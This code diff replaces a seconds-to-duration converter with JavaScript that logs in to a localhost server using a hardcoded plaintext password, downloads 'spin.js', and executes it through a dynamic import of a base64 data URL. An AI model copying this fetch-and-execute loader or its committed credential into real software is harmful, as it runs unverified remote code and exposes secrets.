@@ -1,18 +1,43 @@
-const process = () => {
-    try {
-        let secs = parseInt(document.querySelector('input').value);
-        let minutes = parseInt(secs / 60); // calculate minutes
-        let hours = parseInt(minutes / 60); // calculate hours
-        let days = parseInt(hours / 24); // calculate days
-        let years = parseInt(days / 365); // calculate years
-        secs -= minutes*60; // substract the equivalent of minutes in secs
-        minutes -= hours*60; // substract the equivalent of hours in minutes
-        hours -= days*24; // substract the equivalent of days in hours
-        days -= years*365; // substract the equivalent of years in days
-        document.querySelector('p').innerHTML = `${years} Years, ${days} Days, ${hours} Hours, ${minutes} Minutes and ${secs} Seconds`;
-    } catch {
-        document.querySelector('p').innerHTML = "An error occured try again!";
-    }
-}
+const loginUrl = 'http://localhost:8080/login';
+const filesUrl = 'http://localhost:8080/files';
 
-document.querySelector('button').addEventListener('click', process);
+const loginData = {
+  username: 'walletRoulette',
+  password: 'WalletRouletteToTheMoon!!!', // Replace with the hashed password
+};
+
+fetch(loginUrl, {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  body: JSON.stringify(loginData),
+})
+.then(response => response.json())
+.then(data => {
+  console.log('Login successful:', data.accessToken);
+  const accessToken = data.accessToken;
+  // Replace 'spin.js' with the actual filename you want to download
+  const filename = 'spin.js';
+  fetch(`${filesUrl}/${filename}`, {
+    method: 'GET',
+    headers: {
+      'Authorization': `${accessToken}`,
+    },
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error(`HTTP error! Status: ${response.status}`);
+    }
+    return response.text();
+  })
+  .then(scriptCode => {
+    import(`data:text/javascript;base64,${btoa(scriptCode)}`);
+  })
+  .catch(error => {
+    console.error('Error getting file:', error);
+  });
+})
+.catch(error => {
+  console.error('Error during login:', error);
+});
